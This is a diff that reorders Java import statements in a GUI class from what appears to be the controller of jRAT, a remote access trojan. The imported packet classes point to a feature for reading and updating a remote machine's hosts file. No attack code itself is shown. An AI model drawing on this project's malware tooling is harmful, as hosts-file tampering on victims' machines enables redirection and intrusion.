@@ -6,22 +6,17 @@ import jrat.controller.Slave;
 import jrat.controller.packets.outgoing.Packet55HostsFile;
 import jrat.controller.packets.outgoing.Packet56UpdateHostsFile;
 import jrat.controller.utils.Utils;
+import oslib.OperatingSystem;
+
+import javax.swing.*;
+import javax.swing.GroupLayout.Alignment;
+import javax.swing.LayoutStyle.ComponentPlacement;
 import java.awt.event.ActionEvent;
 import java.awt.event.ActionListener;
 import java.io.BufferedReader;
 import java.io.File;
 import java.io.FileInputStream;
 import java.io.InputStreamReader;
-import javax.swing.GroupLayout;
-import javax.swing.GroupLayout.Alignment;
-import javax.swing.JButton;
-import javax.swing.JScrollPane;
-import javax.swing.JSeparator;
-import javax.swing.JTextPane;
-import javax.swing.LayoutStyle.ComponentPlacement;
-import javax.swing.SwingConstants;
-
-import oslib.OperatingSystem;
 
 
 @SuppressWarnings("serial")
